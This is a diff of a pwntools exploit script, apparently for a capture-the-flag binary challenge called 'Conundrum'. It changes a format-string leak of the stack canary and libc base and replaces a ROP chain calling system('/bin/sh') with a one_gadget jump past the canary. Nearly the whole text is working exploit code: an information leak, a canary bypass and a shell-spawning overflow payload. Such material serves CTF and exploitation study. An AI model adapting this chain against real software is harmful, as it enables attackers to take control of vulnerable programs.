@@ -37,37 +37,28 @@ continue
 # ➜  Conundrum
 
 def leak():
-    payload = '%23$p.%28$p.%29$p'
+    payload = '%23$p.%29$p'
     io.recvuntil('honestly):')
     io.sendline('2')
     io.recvuntil('pointers:')
     io.sendline(payload)
     leak = io.recvline().split(b'.')
     canary = int(leak[0][1::], 16)
-    elf.address = int(leak[1], 16) - (0x56239c600ab0 - 0x56239c600000)
-    libc.address = int(leak[2], 16) - (0x7f7238621c87 - 0x7f7238600000)
+    libc.address = int(leak[1], 16) - (0x7f7238621c87 - 0x7f7238600000)
     info("Canary: %#x", canary)
-    info("Elf base: %#x", elf.address)
     info("Libc base: %#x", libc.address)
 
     return canary
 
 def rop(canary):
     offset = 136
-    pop_rdi = elf.address + 0x0000000000000b13 # pop rdi; ret;
-    ret = elf.address + 0x00000000000006ee # ret; 
-
-    sh = next(libc.search(b'/bin/sh\x00'))
-    system = libc.sym['system']
+    one_gadget = libc.address + 0x4f2a5
 
     payload = flat({
         offset: [
             canary,
-            0xdeadbeef,
-            pop_rdi,
-            sh,
-            ret,
-            system
+            b'A'*8,
+            one_gadget
         ]
     })
 
